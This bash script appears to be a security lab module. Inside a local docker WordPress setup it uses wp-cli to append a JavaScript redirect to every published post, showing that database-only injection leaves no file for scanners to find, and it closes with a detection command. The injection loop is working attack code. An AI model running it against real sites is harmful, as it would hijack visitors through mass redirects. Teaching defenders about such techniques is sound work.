#!/usr/bin/env bash
# Lab module 2: living off the land. No malware is uploaded. The site's OWN
# legitimate tooling (wp-cli) is used to poison the database at scale, the same
# class of technique the campaign used with a trusted Search-Replace-DB tool.
# The lesson: a file scan finds nothing, because there is no malicious file.
set -euo pipefail
cd "$(dirname "$0")"
set -a; . ./.env 2>/dev/null || true; set +a
SINK_PORT="${SINK_PORT:-8019}"
DC="docker compose"

echo "[*] Living off the land: using wp-cli (a legitimate admin tool) to inject"
echo "    the redirect into every published post. No file is written."

$DC exec -T -e SINK_PORT="${SINK_PORT}" wpcli sh -s <<'INNER'
INJ="<script>window.location.href=\"http://localhost:${SINK_PORT}/promo\";</script>"
changed=0
for id in $(wp post list --post_status=publish --field=ID --allow-root); do
  wp post get "$id" --field=post_content --allow-root > /tmp/c
  if ! grep -q "${SINK_PORT}/promo" /tmp/c; then
    printf '%s' "$INJ" >> /tmp/c
    wp post update "$id" /tmp/c --allow-root >/dev/null
    changed=$((changed + 1))
  fi
done
rm -f /tmp/c
echo "posts injected via legitimate tooling: $changed"
INNER

cat <<EOF

[+] Database poisoned using only legitimate admin tooling. For a defender:
    - there is NO malicious file to find; a YARA / file sweep sees nothing
    - the only evidence lives in the database rows themselves
    Detect it (there is no file to grep, only database rows):
      docker compose exec -T wpcli sh -c 'for id in \$(wp post list --post_status=publish --field=ID --allow-root); do wp post get \$id --field=post_content --allow-root | grep -q promo && echo "post \$id poisoned"; done'
    Clean up with ./reset.sh
EOF
